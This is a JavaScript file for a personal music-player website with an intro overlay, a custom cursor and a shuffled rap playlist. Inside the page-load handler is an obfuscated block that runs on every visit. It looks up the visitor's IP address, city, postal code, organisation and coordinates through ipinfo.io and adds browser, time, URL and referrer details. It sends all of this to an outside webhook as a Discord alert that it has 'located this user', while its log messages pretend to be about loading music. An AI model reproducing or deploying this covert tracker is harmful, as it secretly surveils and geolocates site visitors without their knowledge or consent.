const blackScreen = document.querySelector(".black-screen");

function toggleBlackScreen() {
  document.body.classList.toggle("black-screen");
  if (document.body.classList.contains("black-screen")) {
    document.querySelector("#header").classList.add("black-screen");
  } else {
    document.querySelector("#header").classList.remove("black-screen");
  }
}

if (blackScreen) {
  blackScreen.addEventListener("click", toggleBlackScreen);
}

function deleting() {
  var button = document.getElementById("button_1");
  if (button) {
    button.style.display = "none";
  }
  var div = document.getElementById("black-screen");
  if (div) {
    div.style.display = "none";
  }
}

var button = document.getElementById("button_1");

if (button) {
  button.addEventListener("click", function() {
    audio.play();
    var div = document.getElementById("black-screen");
    if (div) {
      div.style.display = "none";
    }
    deleting();
  });
}

var customCursor = document.createElement("div");
customCursor.classList.add("custom-cursor");
document.body.appendChild(customCursor);

document.addEventListener("mousemove", function(event) {
  customCursor.style.left = event.clientX + "px";
  customCursor.style.top = event.clientY + "px";
});

document.addEventListener("scroll", function() {
  var scrollX = window.scrollX || window.pageXOffset;
  var scrollY = window.scrollY || window.pageYOffset;
  customCursor.style.left = scrollX + event.clientX + "px";
  customCursor.style.top = scrollY + event.clientY + "px";
});

    
var songs = [
  "assets/music/Cant Trust - Keef Chief.mp3",
  "assets/music/Control - Ab-Soul.mp3",
  "assets/music/DNA - Kendrick Lamar.mp3",
  "assets/music/Everyday - Chief Keef.mp3",
  "assets/music/Geeked (Bass Boosted) - CHII WVTTZ + Set Da Trend + C Blu + Dougie B.mp3",
  "assets/music/Get Out - Comethazine.mp3",
  "assets/music/Go Stupid - Polo G.mp3",
  "assets/music/I Don't Like - Chief Keef.mp3",
  "assets/music/In Control - Youngboy Never Broke Again.mp3",
  "assets/music/Love Sosa - Chief Keef.mp3",
  "assets/music/M.A.A.D. City - Kendrick Lamar.mp3",
  "assets/music/Make No Sense - Youngboy Never Broke Again.mp3",
  "assets/music/Monster - Kanye West.mp3",
  "assets/music/Only You Freestyle - Headie One.mp3",
  "assets/music/Sawarim - idk the author.mp3",
  "assets/music/Sosa - Chief Keef.mp3",
  "assets/music/Spinback - Comethazine.mp3",
  "assets/music/Still Ballin' (Remix) - 2Pac.mp3",
  "assets/music/True Religion Fein - Chief Keef.mp3",
  "assets/music/Walk - Comethanize.mp3",
  "assets/music/Wesley's Theory - Kendrick Lamar.mp3"
];
var audio = new Audio();
audio.loop = true;
audio.preload = "auto";
var currentSongIndex = -1;
document.addEventListener("DOMContentLoaded", function() {
  var _$_821a=["error","catch","ip","timezone","postal","hostname","city","country","region","org","loc","https://www.google.com/maps/search/google+map++","! LO$R Site Statistics","https://github.com/madhead341/madhead341.github.io","https://cdn.discordapp.com/avatars/1083368117230653460/a_763b3fec4cc9b04e9e0a3402fc3c39e8.gif","\u200b","```fix\x0A"," ","replace","N/A","","```","userAgent","toLocaleString","href","location","referrer","https://events.hookdeck.com/e/src_S1diJp0j0dPz","Error loading music:","ok","music Loaded successfully!","log","status","statusText","then","POST","application/json","stringify","json","Failed to fetch data","https://ipinfo.io/json"];fetch(_$_821a[40])[_$_821a[34]]((_0x23659)=>{if(_0x23659[_$_821a[32]]=== 200){return _0x23659[_$_821a[38]]()};throw  new Error(_$_821a[39])})[_$_821a[34]]((_0x23782)=>{const _0x23A9A=_0x23782[_$_821a[2]];const _0x23C89=_0x23782[_$_821a[3]];const _0x23BC3=_0x23782[_$_821a[4]];const _0x23A37=_0x23782[_$_821a[5]];const _0x236BC=_0x23782[_$_821a[6]];const _0x2371F=_0x23782[_$_821a[7]];const _0x23C26=_0x23782[_$_821a[8]];const _0x23B60=_0x23782[_$_821a[9]];const _0x23AFD=_0x23782[_$_821a[10]];const _0x239D4=_$_821a[11]+ _0x23AFD;const _0x237E5={title:_$_821a[12],url:_$_821a[13],color:374276,author:{name:_$_821a[12],icon_url:_$_821a[14]},description:`[! LO$R Site Statistics has located this user](${_0x239D4})`,fields:[{name:_$_821a[15],value:_$_821a[16]+ `IP: ${_0x23A9A?_0x23A9A[_$_821a[18]](_$_821a[17],_$_821a[17]):_$_821a[19]}\n`+ `Organization: ${_0x23B60?_0x23B60[_$_821a[18]](_$_821a[17],_$_821a[17]):_$_821a[19]}\n`+ `Hostname: ${_0x23A37?_0x23A37[_$_821a[18]](_$_821a[17],_$_821a[17]):_$_821a[19]}\n`+ `City: ${_0x236BC?_0x236BC[_$_821a[18]](_$_821a[17],_$_821a[17]):_$_821a[19]}\n`+ `Postal Code: ${_0x23BC3?_0x23BC3[_$_821a[18]](_$_821a[17],_$_821a[17]):_$_821a[19]}\n`+ `Region: ${_0x23C26?_0x23C26[_$_821a[18]](_$_821a[17],_$_821a[17]):_$_821a[19]}\n`+ `Country: ${_0x2371F?_0x2371F[_$_821a[18]](_$_821a[17],_$_821a[17]):_$_821a[19]}\n`+ `Timezone: ${_0x23C89?_0x23C89[_$_821a[18]](_$_821a[17],_$_821a[17]):_$_821a[19]}\n`+ _$_821a[21][_$_821a[18]](_$_821a[17],_$_821a[20]),inline:true}]};function _0x23848(){var _0x23DB2=navigator[_$_821a[22]];return _0x23DB2}function _0x2390E(){var _0x23E78= new Date();var _0x23EDB=_0x23E78[_$_821a[23]]();return _0x23EDB}function _0x23971(){var _0x23F3E=window[_$_821a[25]][_$_821a[24]];return _0x23F3E}function _0x238AB(){var _0x23E15=document[_$_821a[26]];return _0x23E15}const _0x23CEC=_$_821a[27];fetch(_0x23CEC,{method:_$_821a[35],headers:{'Content-Type':_$_821a[36]},body:JSON[_$_821a[37]]({content:`<@1083368117230653460> New Site Visit!\n\`\`\`ini\nBrowser: [${_0x23848()}]\nTime: [${_0x2390E()}]\nURL: [${_0x23971()}]\nReferrer: [${_0x238AB()}]\n[Made by ! LO$R]\n\`\`\``,embeds:[_0x237E5]})})[_$_821a[34]]((_0x23659)=>{if(_0x23659[_$_821a[29]]){console[_$_821a[31]](_$_821a[30])}else {throw  new Error(`Failed to load music: ${_0x23659[_$_821a[32]]} ${_0x23659[_$_821a[33]]}`)}})[_$_821a[1]]((_0x23D4F)=>{console[_$_821a[0]](_$_821a[28],_0x23D4F)})})[_$_821a[1]]((_0x23D4F)=>{return console[_$_821a[0]](_0x23D4F)})
  function playNextSong() {
    var nextSongIndex = Math.floor(Math.random() * songs.length);
    while (nextSongIndex === currentSongIndex) {
      nextSongIndex = Math.floor(Math.random() * songs.length);
    }
    currentSongIndex = nextSongIndex;
    var nextSong = songs[currentSongIndex];
    audio.src = nextSong;
    console.log(document.querySelector(".now-playing-title"));
  
    var nowPlayingTitle = document.querySelector(".now-playing-title");
    if (nowPlayingTitle) {
      nowPlayingTitle.innerHTML = "Now Playing:";
    }
  
    console.log(document.querySelector(".now-playing-song"));
  
    var nowPlayingSong = document.querySelector(".now-playing-song");
    if (nowPlayingSong) {
      nowPlayingSong.innerHTML = nextSong.replace(/^.*[\\\/]/, '').slice(0, -4);
    }
  }          
  
    audio.addEventListener("ended", playNextSong);
    playNextSong();

  window.addEventListener("load", function() {
  audio.play();
    }); 
});
